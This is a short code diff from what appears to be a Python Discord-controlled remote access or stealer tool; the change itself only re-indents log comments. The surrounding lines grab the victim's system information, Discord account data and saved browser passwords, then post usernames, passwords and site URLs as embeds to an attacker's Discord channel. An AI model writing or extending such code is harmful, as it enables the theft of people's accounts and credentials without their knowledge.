@@ -206,13 +206,13 @@ async def on_ready():
         #.log Sent system information on info channel
 
         accounts = grab_discord.initialize(False)
-            #.log Grabbed Discord (Auto)
+        #.log Grabbed Discord (Auto)
         for account in accounts:
             reaction_msg = await client.get_channel(channel_ids['info']).send(embed=account); await reaction_msg.add_reaction('📌')
-                #.log Sent embed with Discord account data (Auto)
+            #.log Sent embed with Discord account data (Auto)
 
         result = grab_passwords()
-            #.log Grabbed passwords (Auto)
+        #.log Grabbed passwords (Auto)
         embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
         for url in result.keys():
             embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
